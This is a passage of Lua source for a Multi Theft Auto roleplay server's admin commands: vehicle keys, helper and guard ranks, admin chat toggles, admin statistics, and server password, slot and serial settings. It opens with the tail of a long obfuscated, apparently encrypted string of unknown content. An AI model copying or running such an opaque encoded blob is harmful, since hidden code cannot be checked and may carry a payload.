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", "~>'")))) -- Ibacs

function aChangeLock(player,command)
	if not hasPermission(player, "achangelock") then noAdmin(player, "achagelock") return end
	local veh = getPedOccupiedVehicle(player);
	if veh then 
		local id = getElementData(veh,"veh:id");
		if id > 0 then 
			local suc = exports.fv_inventory:givePlayerItem(player,40,1,id,100,0);
			if suc then 
				outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."successfully you made a key to the car!",player,255,255,255,true);

				sendMessageToAdmin(player,getAdminName(player,true).." asked for a key for a vehicle. ID: "..sColor..id..white..".", 3);
				exports.fv_logs:createLog("ACHANGELOCK",getAdminName(player,true).." asked for a key for a vehicle. ID: "..id..".",player);

			else 
				outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You have no place for the key!",player,255,255,255,true);
			end
		else 
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You can't make a key for this game!",player,255,255,255,true);
		end
	else 
		outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You're not in a vehicle!",player,255,255,255,true);
	end
end
addCommandHandler("achangelock",aChangeLock,false,false);

function setHelperLevel(player,command,target,level)
	if not hasPermission(player, "sethelperlevel") then noAdmin(player, "sethelperlevel") return end;
	if not target or not level or not tonumber(level) or not math.floor(tonumber(level)) or tonumber(level) > 2 or tonumber(level) < 0 then 
		outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..command.." [Name/ID] [0-None, 1-IDG.AS, 2-AS]",player,255,255,255,true);
		return;
	end
	local targetPlayer = exports.fv_engine:findPlayer(player,target);
	local level = math.floor(tonumber(level));
	if level and targetPlayer then 
		local oValue = getElementData(targetPlayer,"admin >> level");
		if (level == 2 or level == 0) and getElementData(player,"admin >> level") <= 6 then 
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."IDG only. You can give / take AS.",player,255,255,255,true);
			return;
		end
		if oValue == level then 
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Player is already in the rank of gave!",player,255,255,255,true);
			return
		end
		setElementData(targetPlayer,"admin >> level",level);
		if level ~= 1 then --Ha nem IDG.
			dbExec(connection,"UPDATE characters SET adminlevel=? WHERE id=?",level,getElementData(targetPlayer,"acc >> id"));
		end
		local serverName = exports["fv_engine"]:getServerData("name");
		exports['fv_engine']:sendMessageToAdmin(player,hexColor.."[".. serverName .. "] "..hexColor..getAdminName(player,true)..white.." changed "..hexColor..getAdminName(targetPlayer,true)..white.." administrative assistant level. "..hexColor.."("..(aTitles[oValue] or "Unknown").." => "..(aTitles[level] or "Unknown")..")", 0)
		exports['fv_logs']:createLog("fv_admin",getAdminName(player,true).." changed " ..getAdminName(targetPlayer,true).. " administrative assistant level "..(aTitles[oValue] or "Unknown").." > "..(aTitles[level] or "Unknown"),player,targetPlayer )
	else 
		outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Player not found!",player,255,255,255,true);
		return;
	end
end
addCommandHandler("sethelperlevel",setHelperLevel,false,false);

function togAdminChat(player,command)
	if not hasPermission(player, "toga") then noAdmin(player, "toga") return end;
	local state = (getElementData(player,"togAdminChat") or false);
	if state then 
		setElementData(player,"togAdminChat",false);
		outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You have disabled AdminChat!",player,255,255,255,true);
	else 
		setElementData(player,"togAdminChat",true);
		outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."You have enabled AdminChat!",player,255,255,255,true);
	end
end
addCommandHandler("toga",togAdminChat,false,false);

function togPM(player,command)
	if not hasPermission(player, "togpm") then noAdmin(player, "togpm") return end;
	local state = (getElementData(player,"pmEnabled") or false);
	if state then 
		setElementData(player,"pmEnabled",false);
		outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You turned off the PMs!",player,255,255,255,true);
	else 
		setElementData(player,"pmEnabled",true);
		outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."You turned on the PMs!",player,255,255,255,true);
	end
end
addCommandHandler("togpm",togPM,false,false);


--[[function setServerSlot(player,command,slot)
	if not hasPermission(player, "setserverslot") then noAdmin(player, "setserverslot") return end;
	if not slot or not math.floor(tonumber(slot)) then 
		outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..command.." [SLOT]",player,255,255,255,true);
		return;
	end
	local slot = math.floor(tonumber(slot));
	if setMaxPlayers(slot) then 
		outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."Szerver SLOT állítva. "..exports.fv_engine:getServerColor("blue",true).." ("..slot..")",player,255,255,255,true);
	else 
		outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Sikertelen slot állítás.",player,255,255,255,true);
	end
end
addCommandHandler("setserverslot",setServerSlot,false,false);
--]]
function getAdminStats(player,command,...)
	if not hasPermission(player, "adminstats") then noAdmin(player, "adminstats") return end;
	if not ... then 
		outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..command.." [Admin name]",player,255,255,255,true);
		return;
	end
	local name = table.concat({...}," ");
	dbQuery(function(qh)
		local res = dbPoll(qh,0);
		if #res > 0 then 
			for k,v in pairs(res) do 
				outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."Admin statistics : "..hexColor..name..white..".",player,255,255,255,true);
				outputChatBox("Adminduty: "..hexColor..(v.adutytime)..white..".",player,255,255,255,true);
				outputChatBox("RTC: "..hexColor..(v.rtc)..white..".",player,255,255,255,true);
				outputChatBox("Fix: "..hexColor..(v.fix)..white..".",player,255,255,255,true);
				outputChatBox("Fuel: "..hexColor..(v.fuel)..white..".",player,255,255,255,true);
				outputChatBox("Ban: "..hexColor..(v.ban)..white..".",player,255,255,255,true);
				outputChatBox("Jail: "..hexColor..(v.jail)..white..".",player,255,255,255,true);
				outputChatBox("Kick: "..hexColor..(v.kick)..white..".",player,255,255,255,true);
				outputChatBox("PM: "..hexColor..(v.pm)..white..".",player,255,255,255,true);
				outputChatBox("Admin name: "..hexColor..(v.valasz)..white..".",player,255,255,255,true);
			end
		else 
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."There is no admin with that name!",player,255,255,255,true);
			return;
		end
	end,sql,"SELECT * FROM characters WHERE adminname=? AND adminlevel > 0",name);
end
addCommandHandler("adminstats",getAdminStats,false,false);

function setGuard(player,cmd,target,state)
	if getElementData(player,"admin >> level") > 10 then --Fejlesztőtől
		if not target or not state then 
			return outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [Partial name/ID] [Status (0-No, 1-Yes)]",player,255,255,255,true);
		end
		local state = tonumber(state);
		local targetPlayer = exports.fv_engine:findPlayer(player,target);
		if not targetPlayer or not getElementData(targetPlayer,"loggedIn") then 
			return outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Player not found.",player,255,255,255,true);
		end
		if state == 0 or state == 1 then 
			if state == 0 then 
				setElementData(targetPlayer,"admin >> level",0);
				outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."RP guard rank taken from: "..hexColor..getAdminName(targetPlayer,true)..white..".",player,255,255,255,true);
			elseif state == 1 then 
				setElementData(targetPlayer,"admin >> level",-1);
				outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."RP guard rank given to: "..hexColor..getAdminName(targetPlayer,true)..white..".",player,255,255,255,true);
			end
		else 
			return outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [Partial name/ID] [Status (0-No, 1-Yes)]",player,255,255,255,true);
		end
	end
end
addCommandHandler("setguard",setGuard,false,false);

addCommandHandler("setvehpaintjob", function(player, cmd, id)
	if getElementData(player,"admin >> level") > 10 then
		if isPedInVehicle(player) then
			
			if id then
				local veh = getPedOccupiedVehicle(player)
				setElementData(veh,"tuning.paintJob",id);
			end
		end
	end
end)


addCommandHandler("setserverpassword", function(player, cmd, pass)
	if getElementData(player,"admin >> level") >= 11 then
		if setServerPassword(pass) then
			if pass then
				outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Server password set to " .. pass,player,255,255,255,true);
			else
				outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Server password removed",player,255,255,255,true);
			end
		end
	end
end)

addCommandHandler("setserverslot", function(player, cmd, slot)
	if getElementData(player,"admin >> level") >= 11 then
		if not slot then
			outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [Slot]",player,255,255,255,true);
		else
			--if tonumber(getServerConfigSetting("maxplayers")) < slot then
			--	outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."A slot nem lehet nagyobb ennél az értéknél: " .. tonumber(getServerConfigSetting("maxplayers")) ,player,255,255,255,true);
			--else
				if setMaxPlayers(tonumber(slot)) then
					triggerClientEvent(getElementsByType("player"), "receiveServerSlot", player, slot)
					outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Server slot set to " .. slot,player,255,255,255,true);
				end
			--end
		end
	end
end)

function setSerial(player,command, username, serial)
	if getElementData(player,"admin >> level") >= 11 then
		if not username or not serial then 
			outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..command.." [User Name] [Serial]",player,255,255,255,true);
			return;
		end

		local res = dbExec(sql, "UPDATE accounts SET serial = ? WHERE name = ?", serial, username)
		if res then
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Successful serial switch for this user: " .. username,player,255,255,255,true);
		end
	end
end
addCommandHandler("changeserial",setSerial,false,false);
